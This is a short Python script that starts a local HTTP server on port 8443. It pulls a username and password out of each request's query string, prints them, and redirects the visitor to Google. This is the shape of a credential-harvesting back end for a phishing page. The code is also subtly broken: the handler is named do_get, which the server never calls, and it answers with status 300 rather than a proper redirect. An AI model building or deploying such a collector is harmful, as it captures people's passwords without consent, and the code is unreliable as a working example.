from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse,parse_qs

host_name = "localhost"
server_port = 8443

# create a simple server
class MyServer(BaseHTTPRequestHandler):
    def do_get(self):
        # parse our url queries
        queries = parse_qs(urlparse(self.path).query)

        # look for the username and password via the url
        print("Username: %s, Password: %s" % (queries["user"][0], queries["password"][0]))

        # redirect to google
        self.send_response(300)
        self.send_header("Location", "http://www.google.com")
        self.end_headers()

if __name__ == "__main__":
    web_server = HTTPServer((host_name, server_port), MyServer)

    print("Serving on %s:%s" % (host_name, server_port))

    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        pass

    web_server.server_close()
    print("Server stopped")